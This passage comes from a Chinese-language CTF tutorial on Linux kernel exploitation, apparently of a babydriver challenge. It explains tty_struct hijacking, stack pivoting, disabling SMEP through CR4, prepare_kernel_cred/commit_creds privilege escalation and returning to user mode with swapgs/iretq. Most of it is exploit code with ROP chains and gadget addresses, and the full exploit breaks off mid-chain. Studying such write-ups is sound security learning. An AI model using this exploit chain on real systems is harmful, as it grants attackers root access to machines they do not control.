%p\n"</span>, *ops_ptr_addr);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改并覆写 tty_struct 结构体</span></span><br><span class="line">*ops_ptr_addr = (<span class="keyword">char</span>*)fake_tty_ops;</span><br><span class="line">write(fd2, overwrite_mem, <span class="keyword">sizeof</span>(overwrite_mem));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[+] hacked ops ptr addr: %p\n"</span>, *ops_ptr_addr);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 触发 tty_write</span></span><br><span class="line"><span class="comment">// 注意使用 write 时， buf 指针必须有效，否则会提前返回 EFAULT</span></span><br><span class="line"><span class="keyword">int</span> buf[] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">write(master_fd, buf, <span class="number">8</span>);</span><br></pre></td></tr></table></figure>
<p>可以看到栈指针已经成功被劫持到用户空间中：</p>
<p><img src="/2021/10/kernel_pwn_introduction/image-20211013163918810.png" alt="image-20211013163918810"></p>
<h6 id="4-2-关闭-SMEP-ret2usr提权">4.2) 关闭 SMEP + ret2usr提权</h6>
<p>劫持栈指针后，我们现在可以尝试提权。正常来说，在<strong>内核</strong>里需要执行以下代码来进行提权：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> * <span class="title">root_cred</span> = <span class="title">prepare_kernel_cred</span>(<span class="title">NULL</span>);</span></span><br><span class="line">commit_creds(root_cred);</span><br></pre></td></tr></table></figure>
<p>其中，<code>prepare_kernel_cred</code>函数用于获取传入 <code>task_struct</code> 结构指针的 cred 结构。需要注意的是，如果传入的指针是 <strong>NULL</strong>，则<strong>函数返回的 cred 结构将是 init_cred，其中uid、gid等等均为 root 级别</strong>。</p>
<p><code>commit_creds</code>函数用于将当前进程的 <code>cred</code> 更新为新传入的 <code>cred</code> 结构，如果我们将当前进程的 cred 更新为 root 等级的 cred，则达到我们提权的目的。</p>
<p>为了利用简便，我们可以先关闭 SMEP，跳转进用户代码中直接执行预编译好的提权指令。</p>
<p>SMEP 标志在寄存器 CR4 上，因此我们可以通过重设 CR4 寄存器来关闭 SMEP，最后提权：</p>
<p><img src="/2021/10/kernel_pwn_introduction/c76896800a175ad42f2bcdd31c5c083f.png" alt="image"></p>
<p>我们先看一下当前的 cr4 寄存器的值</p>
<p><img src="/2021/10/kernel_pwn_introduction/image-20211013172645328.png" alt="image-20211013172645328"></p>
<p>之后只要将 cr4 覆盖为 0x6f0 即可。</p>
<p>相关实现如下所示：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_root_cred</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">void</span>* (*prepare_kernel_cred)(<span class="keyword">void</span>*) = (<span class="keyword">void</span>* (*)(<span class="keyword">void</span>*))prepare_kernel_cred_addr;</span><br><span class="line">    <span class="keyword">void</span> (*commit_creds)(<span class="keyword">void</span>*) = (<span class="keyword">void</span> (*)(<span class="keyword">void</span>*))commit_creds_addr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> * root_cred = prepare_kernel_cred(<span class="literal">NULL</span>);</span><br><span class="line">    commit_creds(root_cred);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    [...]</span><br><span class="line">    <span class="comment">// 准备 ROP</span></span><br><span class="line">    <span class="keyword">u_int64_t</span>* hijacked_stack_ptr = (<span class="keyword">u_int64_t</span>*)hijacked_stack_addr;</span><br><span class="line">    hijacked_stack_ptr[<span class="number">0</span>] = pop_rdi_addr;              <span class="comment">// pop rdi; ret</span></span><br><span class="line">    hijacked_stack_ptr[<span class="number">1</span>] = <span class="number">0x6f0</span>;                     <span class="comment">// new cr4</span></span><br><span class="line">    hijacked_stack_ptr[<span class="number">2</span>] = mov_cr4_rdi_pop_rbp_addr;  <span class="comment">// mov cr4, rdi; pop rbp; ret;</span></span><br><span class="line">    hijacked_stack_ptr[<span class="number">3</span>] = <span class="number">0</span>;                         <span class="comment">// dummy</span></span><br><span class="line">    hijacked_stack_ptr[<span class="number">4</span>] = (<span class="keyword">u_int64_t</span>)set_root_cred;  <span class="comment">// set root</span></span><br><span class="line">    <span class="comment">// todo ROP</span></span><br><span class="line">    [...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h6 id="4-3-返回用户态-get-shell">4.3) 返回用户态 + get shell</h6>
<blockquote>
<p>当我们提权了当前进程后，剩下要做的事情就是<strong>返回至用户态</strong>并启动新shell。</p>
<p>可能有小伙伴会问，既然都劫持了内核控制流了，那是不是可以直接启动 shell ？为什么还要返回至用户态？</p>
<p>个人的理解是，劫持内核控制流后，由于改变了内核的正常运行逻辑，因此此时内核鲁棒性降低，稍微敏感的一些操作都有可能会导致内核挂掉。最稳妥的方式是回到更加稳定的用户态中，而且 root 权限的用户态程序同样可以做到内核权限所能做到的事情。</p>
<p>除了上面所说的以外，还有一个很重要的原因是：一般情况下在用户空间构造特定目的的代码要比在内核空间简单得多。</p>
</blockquote>
<p>如何从内核态返回至用户态中？我们可以从 syscall 的入口代码入手，先看看这部分代码：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">ENTRY(entry_SYSCALL_64)</span><br><span class="line">  SWAPGS_UNSAFE_STACK</span><br><span class="line"><span class="meta">GLOBAL</span>(entry_SYSCALL_64_after_swapgs)</span><br><span class="line">  <span class="keyword">movq</span>  %rsp, PER_CPU_VAR(rsp_scratch)</span><br><span class="line">  <span class="keyword">movq</span>  PER_CPU_VAR(cpu_current_top_of_stack), %rsp</span><br><span class="line"></span><br><span class="line">  /* Construct struct pt_regs on stack */</span><br><span class="line">  pushq  $__USER_DS      /* pt_regs-&gt;<span class="built_in">ss</span> */</span><br><span class="line">  pushq  PER_CPU_VAR(rsp_scratch)  /* pt_regs-&gt;<span class="built_in">sp</span> */</span><br><span class="line"></span><br><span class="line">  ENABLE_INTERRUPTS(CLBR_NONE)</span><br><span class="line">  pushq  %r11        /* pt_regs-&gt;flags */</span><br><span class="line">  pushq  $__USER_CS      /* pt_regs-&gt;<span class="built_in">cs</span> */</span><br><span class="line">  pushq  %rcx        /* pt_regs-&gt;<span class="built_in">ip</span> */</span><br><span class="line">  pushq  %rax        /* pt_regs-&gt;orig_ax */</span><br><span class="line">  pushq  %rdi        /* pt_regs-&gt;<span class="built_in">di</span> */</span><br><span class="line">  pushq  %rsi        /* pt_regs-&gt;<span class="built_in">si</span> */</span><br><span class="line">  pushq  %rdx        /* pt_regs-&gt;<span class="built_in">dx</span> */</span><br><span class="line">  pushq  %rcx        /* pt_regs-&gt;<span class="built_in">cx</span> */</span><br><span class="line">  pushq  $-ENOSYS      /* pt_regs-&gt;<span class="built_in">ax</span> */</span><br><span class="line">  pushq  %r8        /* pt_regs-&gt;<span class="built_in">r8</span> */</span><br><span class="line">  pushq  %r9        /* pt_regs-&gt;<span class="built_in">r9</span> */</span><br><span class="line">  pushq  %r10        /* pt_regs-&gt;<span class="built_in">r10</span> */</span><br><span class="line">  pushq  %r11        /* pt_regs-&gt;<span class="built_in">r11</span> */</span><br><span class="line">  <span class="keyword">sub</span>  $(<span class="number">6</span>*<span class="number">8</span>), %rsp      /* pt_regs-&gt;<span class="built_in">bp</span>, <span class="built_in">bx</span>, <span class="built_in">r12</span>-<span class="number">15</span> <span class="keyword">not</span> saved */</span><br></pre></td></tr></table></figure>
<p>可以看到，控制流以进入入口点后，并立即执行<code>swapgs</code>指令，将当前 GS 寄存器切换成 kernel GS，之后切换栈指针至内核栈，并在内核栈中构造结构体 <code>pt_regs</code>。</p>
<p>该结构体声明如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pt_regs</span> &#123;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * C ABI says these regs are callee-preserved. They aren't saved on kernel entry</span></span><br><span class="line"><span class="comment"> * unless syscall needs a complete, fully filled "struct pt_regs".</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> r15;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> r14;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> r13;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> r12;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> rbp;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> rbx;</span><br><span class="line"><span class="comment">/* These regs are callee-clobbered. Always saved on kernel entry. */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> r11;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> r10;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> r9;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> r8;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> rax;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> rcx;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> rdx;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> rsi;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> rdi;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * On syscall entry, this is syscall#. On CPU exception, this is error code.</span></span><br><span class="line"><span class="comment"> * On hw interrupt, it's IRQ number:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> orig_rax;</span><br><span class="line"><span class="comment">/* Return frame for iretq */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> rip;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> cs;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> eflags;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> rsp;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> ss;</span><br><span class="line"><span class="comment">/* top of stack page */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>结合动态调试可以发现，在控制流到达 syscall 入口点之前，<code>pt_regs</code>结构体中的 <code>rip</code>、<code>cs</code>、<code>eflags</code>、<code>rsp</code> 以及 <code>ss</code> 五个寄存器均已压栈。</p>
<p>我们还可以在该文件中找到下面的代码片段</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">opportunistic_sysret_failed:</span></span><br><span class="line">  <span class="keyword">SWAPGS</span></span><br><span class="line">  <span class="keyword">jmp</span>  restore_c_regs_and_iret</span><br><span class="line">  </span><br><span class="line">[...]</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"> * <span class="meta">At</span> this label, code paths which return to kernel <span class="keyword">and</span> to user,</span><br><span class="line"> * which come from interrupts/exception <span class="keyword">and</span> from syscalls, merge.</span><br><span class="line"> */</span><br><span class="line"><span class="meta">GLOBAL</span>(restore_regs_and_iret)</span><br><span class="line">  RESTORE_EXTRA_REGS</span><br><span class="line"><span class="symbol">restore_c_regs_and_iret:</span></span><br><span class="line">  RESTORE_C_REGS</span><br><span class="line">  REMOVE_PT_GPREGS_FROM_STACK <span class="number">8</span></span><br><span class="line">  INTERRUPT_RETURN</span><br></pre></td></tr></table></figure>
<p>根据上面的分析信息，我们不难推断出，若想从内核态返回至用户态，则需要依次完成以下两件事情：</p>
<ul>
<li>再执行一次 swapgs 指令，将当前的 GS 寄存器从 kernel gs 换回 user gs</li>
<li>手动在栈上构造 iret 指令所需要的5个寄存器值，然后调用 iret 指令。</li>
</ul>
<p>因此最终实现的部分代码如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+] got shell, welcome %s\n"</span>, (getuid() ? <span class="string">"user"</span> : <span class="string">"root"</span>));</span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> user_cs, user_eflags, user_rsp, user_ss;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_iret_data</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    __asm__ __volatile__ (<span class="string">"mov %%cs, %0"</span> : <span class="string">"=r"</span> (user_cs));</span><br><span class="line">    __asm__ __volatile__ (<span class="string">"pushf"</span>);</span><br><span class="line">    __asm__ __volatile__ (<span class="string">"pop %0"</span> : <span class="string">"=r"</span> (user_eflags));</span><br><span class="line">    __asm__ __volatile__ (<span class="string">"mov %%rsp, %0"</span> : <span class="string">"=r"</span> (user_rsp));</span><br><span class="line">    __asm__ __volatile__ (<span class="string">"mov %%ss, %0"</span> : <span class="string">"=r"</span> (user_ss));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    save_iret_data();</span><br><span class="line">    <span class="built_in">printf</span>(</span><br><span class="line">        <span class="string">"[+] iret data saved.\n"</span></span><br><span class="line">        <span class="string">"    user_cs: %ld\n"</span></span><br><span class="line">        <span class="string">"    user_eflags: %ld\n"</span></span><br><span class="line">        <span class="string">"    user_rsp: %p\n"</span></span><br><span class="line">        <span class="string">"    user_ss: %ld\n"</span>,</span><br><span class="line">        user_cs, user_eflags, (<span class="keyword">char</span>*)user_rsp, user_ss</span><br><span class="line">    );</span><br><span class="line">    [...]</span><br><span class="line">    <span class="keyword">u_int64_t</span>* hijacked_stack_ptr = (<span class="keyword">u_int64_t</span>*)hijacked_stack_addr;</span><br><span class="line">    <span class="keyword">int</span> idx = <span class="number">0</span>;</span><br><span class="line">    hijacked_stack_ptr[idx++] = pop_rdi_addr;              <span class="comment">// pop rdi; ret</span></span><br><span class="line">    hijacked_stack_ptr[idx++] = <span class="number">0x6f0</span>;</span><br><span class="line">    hijacked_stack_ptr[idx++] = mov_cr4_rdi_pop_rbp_addr;  <span class="comment">// mov cr4, rdi; pop rbp; ret;</span></span><br><span class="line">    hijacked_stack_ptr[idx++] = <span class="number">0</span>;                         <span class="comment">// dummy</span></span><br><span class="line">    hijacked_stack_ptr[idx++] = (<span class="keyword">u_int64_t</span>)set_root_cred;</span><br><span class="line">    <span class="comment">// 新添加的 ROP 链</span></span><br><span class="line">    hijacked_stack_ptr[idx++] = swapgs_pop_rbp_addr;</span><br><span class="line">    hijacked_stack_ptr[idx++] = <span class="number">0</span>;                          <span class="comment">// dummy</span></span><br><span class="line">    hijacked_stack_ptr[idx++] = iretq_addr;</span><br><span class="line">    hijacked_stack_ptr[idx++] = (<span class="keyword">u_int64_t</span>)get_shell;       <span class="comment">// iret_data.rip</span></span><br><span class="line">    hijacked_stack_ptr[idx++] = user_cs;</span><br><span class="line">    hijacked_stack_ptr[idx++] = user_eflags;</span><br><span class="line">    hijacked_stack_ptr[idx++] = user_rsp;</span><br><span class="line">    hijacked_stack_ptr[idx++] = user_ss;</span><br><span class="line">    [...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h6 id="4-4-ROP-注意点">4.4) ROP 注意点</h6>
<p>在往常的用户层面的利用，我们无需关注<strong>缺页错误</strong>这样的一个无关紧要的异常。然而在内核利用中，缺页错误往往非常致命（不管是否是可恢复的，即正常的缺页错误也很致命），大概率会直接引发 <strong>double fault</strong>，致使内核重启：</p>
<p><img src="/2021/10/kernel_pwn_introduction/image-20211013173842187.png" alt="image-20211013173842187"></p>
<p>因此在构造 ROP 链时，应尽量避免在内核中直接引用那些<strong>尚未装载页面的内存页</strong>。</p>
<p>再一个问题是单步调试。在调试内核 ROP 链时，有概率会在单步执行时直接跑炸内核，但先给该位置下断点后，再跑至该位置则执行正常。这个调试…仁者见仁智者见智吧（滑稽）</p>
<h6 id="4-5-完整-exploit">4.5) 完整 exploit</h6>
<p>完整的 exploit 如下所示：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> xchg_eax_esp_addr           0xffffffff8100008a</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> prepare_kernel_cred_addr    0xffffffff810a1810</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> commit_creds_addr           0xffffffff810a1420</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pop_rdi_addr                0xffffffff810d238d</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> mov_cr4_rdi_pop_rbp_addr    0xffffffff81004d80</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> swapgs_pop_rbp_addr         0xffffffff81063694          </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> iretq_addr                  0xffffffff814e35ef</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_root_cred</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">void</span>* (*prepare_kernel_cred)(<span class="keyword">void</span>*) = (<span class="keyword">void</span>* (*)(<span class="keyword">void</span>*))prepare_kernel_cred_addr;</span><br><span class="line">    <span class="keyword">void</span> (*commit_creds)(<span class="keyword">void</span>*) = (<span class="keyword">void</span> (*)(<span class="keyword">void</span>*))commit_creds_addr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> * root_cred = prepare_kernel_cred(<span class="literal">NULL</span>);</span><br><span class="line">    commit_creds(root_cred);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+] got shell, welcome %s\n"</span>, (getuid() ? <span class="string">"user"</span> : <span class="string">"root"</span>));</span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> user_cs, user_eflags, user_rsp, user_ss;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_iret_data</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    __asm__ __volatile__ (<span class="string">"mov %%cs, %0"</span> : <span class="string">"=r"</span> (user_cs));</span><br><span class="line">    __asm__ __volatile__ (<span class="string">"pushf"</span>);</span><br><span class="line">    __asm__ __volatile__ (<span class="string">"pop %0"</span> : <span class="string">"=r"</span> (user_eflags));</span><br><span class="line">    __asm__ __volatile__ (<span class="string">"mov %%rsp, %0"</span> : <span class="string">"=r"</span> (user_rsp));</span><br><span class="line">    __asm__ __volatile__ (<span class="string">"mov %%ss, %0"</span> : <span class="string">"=r"</span> (user_ss));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    save_iret_data();</span><br><span class="line">    <span class="built_in">printf</span>(</span><br><span class="line">        <span class="string">"[+] iret data saved.\n"</span></span><br><span class="line">        <span class="string">"    user_cs: %ld\n"</span></span><br><span class="line">        <span class="string">"    user_eflags: %ld\n"</span></span><br><span class="line">        <span class="string">"    user_rsp: %p\n"</span></span><br><span class="line">        <span class="string">"    user_ss: %ld\n"</span>,</span><br><span class="line">        user_cs, user_eflags, (<span class="keyword">char</span>*)user_rsp, user_ss</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd1 = open(<span class="string">"/dev/babydev"</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">int</span> fd2 = open(<span class="string">"/dev/babydev"</span>, O_RDWR);</span><br><span class="line">    ioctl(fd1, <span class="number">65537</span>, <span class="number">0x2e0</span>);</span><br><span class="line"></span><br><span class="line">    close(fd1);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 申请 tty_struct</span></span><br><span class="line">    <span class="keyword">int</span> master_fd = open(<span class="string">"/dev/ptmx"</span>, O_RDWR);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 构造一个 fake tty_operators</span></span><br><span class="line">    <span class="keyword">u_int64_t</span> fake_tty_ops[] = &#123;</span><br><span class="line">        <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">        xchg_eax_esp_addr, <span class="comment">// int  (*write)(struct tty_struct*, const unsigned char *, int)</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+] fake_tty_ops constructed\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">u_int64_t</span> hijacked_stack_addr = ((<span class="keyword">u_int64_t</span>)fake_tty_ops &amp; <span class="number">0xffffffff</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+] hijacked_stack addr: %p\n"</span>, (<span class="keyword">char</span>*)hijacked_stack_addr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span>* fake_stack = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> ((fake_stack = mmap(</span><br><span class="line">            (<span class="keyword">char</span>*)((hijacked_stack_addr &amp; (~<span class="number">0xffff</span>))),  <span class="comment">// addr, 页对齐</span></span><br><span class="line">            <span class="number">0x10000</span>,                                     <span class="comment">// length</span></span><br><span class="line">            PROT_READ | PROT_WRITE,                     <span class="comment">// prot</span></span><br><span class="line">            MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED,    <span class="comment">// flags</span></span><br><span class="line">            <span class="number">-1</span>,                                         <span class="comment">// fd</span></span><br><span class="line">            <span class="number">0</span>)                                          <span class="comment">// offset</span></span><br><span class="line">        ) == MAP_FAILED)  </span><br><span class="line">        perror(<span class="string">"mmap"</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+]     fake_stack addr: %p\n"</span>, fake_stack);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">u_int64_t</span>* hijacked_stack_ptr = (<span class="keyword">u_int64_t</span>*)hijacked_stack_addr;</span><br><span class="line">    <span class="keyword">int</span> idx = <span class="number">0</span>;</span><br><span class="line">    hijacked_stack_ptr[idx++] = pop_rdi_addr;              <span class="comment">// pop rdi; ret</span></span><br><span class="line">    